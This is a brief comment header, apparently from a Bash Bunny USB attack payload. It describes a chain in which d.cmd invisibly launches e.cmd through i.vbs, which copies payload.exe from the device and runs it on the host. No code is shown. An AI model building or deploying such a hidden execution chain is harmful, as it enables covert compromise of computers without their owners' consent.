# Description: Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
#              which in turn executes e.cmd invisibly using i.vbs
#              which in turn copies payload.exe from the root of the Bash Bunny and then executes it
#              using the --startup parameter. Change these settings inside of e.cmd.
